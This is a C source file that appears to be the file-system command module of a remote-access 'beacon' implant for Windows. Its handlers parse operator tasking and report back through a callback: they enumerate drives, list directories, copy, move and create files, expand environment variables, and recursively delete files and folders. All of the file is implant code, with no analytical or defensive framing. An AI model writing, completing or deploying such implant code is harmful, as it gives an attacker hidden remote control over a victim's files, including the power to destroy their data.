#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <direct.h>
#include "commands.h"
#include "parse.h"
#include "beacon.h"
#include "bformat.h"

void command_file_drives(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
	formatp         format;
	datap  parser;
	int    reqid;

	/* init our data parser and output buffer! */
	data_init(&parser, buffer, length);
	bformat_init(&format, 128);

	/* extract our callback ID */
	reqid = data_int(&parser);

	/* copy the callback ID and drive info */
	bformat_int(&format, reqid);
	bformat_printf(&format, "%u", GetLogicalDrives());

	/* make the callback */
	callback(bformat_string(&format), bformat_length(&format), CALLBACK_PENDING);

	/* clean up! */
	bformat_free(&format);
}

/* check if file is a directory or not */
BOOL isDirectory(char * name) {
	return (GetFileAttributes(name) & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY;
}

void dfile(char * parent, char * file, BOOL folder) {
	char * merge = (char *)malloc(16384);
	_snprintf(merge, 16384, "%s\\%s", parent, file);

	if (folder) {
		_rmdir(merge);
	}
	else {
		remove(merge);
	}

	free(merge);
}

void command_file_delete(char * buffer, int length) {
	datap  parser;
	char * filename;

	data_init(&parser, buffer, length);
	filename = data_string_oneoff_FREEME(&parser, 16384);

	if (isDirectory(filename)) {
		recurse(filename, dfile);
		_rmdir(filename);
	}
	else {
		remove(filename);
	}

	free(filename);
}

void command_file_mkdir(char * buffer, int length) {
	datap parser;
	char * folder;

	data_init(&parser, buffer, length);
	folder = data_string_oneoff_FREEME(&parser, 16384);

	_mkdir(folder);

	free(folder);
}

void command_file_copy(char * buffer, int length) {
	datap   parser;
	datap * local;
	char * src;
	char * dst;

	/* allocate some data to work with */
	local = data_alloc(16384);
	src   = data_ptr(local, 8192);
	dst   = data_ptr(local, 8192);

	/* extract our arguments */
	data_init(&parser, buffer, length);
	data_string(&parser, src, 8192);
	data_string(&parser, dst, 8192);

	/* perform the copy, please */
	if (!CopyFileA(src, dst, FALSE))
		post_error_d(0xd, GetLastError());

	/* free our data */
	data_free(local);
}

void command_file_move(char * buffer, int length) {
	datap   parser;
	datap * local;
	char * src;
	char * dst;

	/* allocate some data to work with */
	local = data_alloc(16384);
	src   = data_ptr(local, 8192);
	dst   = data_ptr(local, 8192);

	/* extract our arguments */
	data_init(&parser, buffer, length);
	data_string(&parser, src, 8192);
	data_string(&parser, dst, 8192);

	/* perform the copy, please */
	if (!MoveFileA(src, dst))
		post_error_d(0xe, GetLastError());

	/* free our data */
	data_free(local);
}

void command_file_list(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;
	SYSTEMTIME temp, result;

	formatp         format;
	datap  parser;
	int    reqid;

	char * folder = (char *)malloc(sizeof(char) * 16384);
	memset(folder, 0, 16384);

	/* init our data parser */
	data_init(&parser, buffer, length);

	/* extract our callback ID */
	reqid = data_int(&parser);

	/* extract the folder */
	data_string(&parser, folder, 16384);

	/* init our output buffer */
	bformat_init(&format, 1024 * 2048);

	/* copy the callback ID to our output */
	bformat_int(&format, reqid);

	/* handle special case of current directory */
	if (strncmp(folder, ".\\*", 16384) == 0) {
		GetCurrentDirectory(16384, folder);
		strncat_s(folder, 16384, "\\*", 2);
	}

	/* add folder to listing */
	bformat_printf(&format, "%s\n", folder);

	hFind = FindFirstFile(folder, &ffd);

	if (INVALID_HANDLE_VALUE == hFind) {
		/* post an error */
		post_error_sd(0x34, folder, GetLastError());

		/* send output anyways */
		callback(bformat_string(&format), bformat_length(&format), CALLBACK_PENDING);

		free(folder);
		bformat_free(&format);
		return;
	}
	else {
		free(folder);
	}

	do {
		/* convert the FILETIME to something useful */
		FileTimeToSystemTime(&(ffd.ftLastWriteTime), &temp);
		SystemTimeToTzSpecificLocalTime(NULL, &temp, &result);

		if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) {
			bformat_printf(&format, "D\t0\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n", result.wMonth, result.wDay, result.wYear, result.wHour, result.wMinute, result.wSecond, ffd.cFileName);
		}
		else {
			/* move our filesize to its own thing */
			filesize.LowPart = ffd.nFileSizeLow;
			filesize.HighPart = ffd.nFileSizeHigh;

			bformat_printf(&format, "F\t%I64d\t%02d/%02d/%02d %02d:%02d:%02d\t%s\n", filesize.QuadPart, result.wMonth, result.wDay, result.wYear, result.wHour, result.wMinute, result.wSecond, ffd.cFileName);
		}
	} while (FindNextFile(hFind, &ffd) != 0);

	FindClose(hFind);

	callback(bformat_string(&format), bformat_length(&format), CALLBACK_PENDING);
	bformat_free(&format);
}

/* expand our environment variables? */
DWORD env_expand(char * src, char * dst, DWORD maxdst) {
	DWORD size;

	/* calculate our needed space */
	size = ExpandEnvironmentStringsA(src, NULL, 0);

	/* did we fail? */
	if (size == 0)
		return 0;

	/* check that our expanded string fits our dst space */
	if ((size + 1) >= maxdst)
		return 0;

	/* empty out the target path */
	memset(dst, 0, maxdst);

	/* expand our environment vars and populate dst */
	return ExpandEnvironmentStringsA(src, dst, size);
}
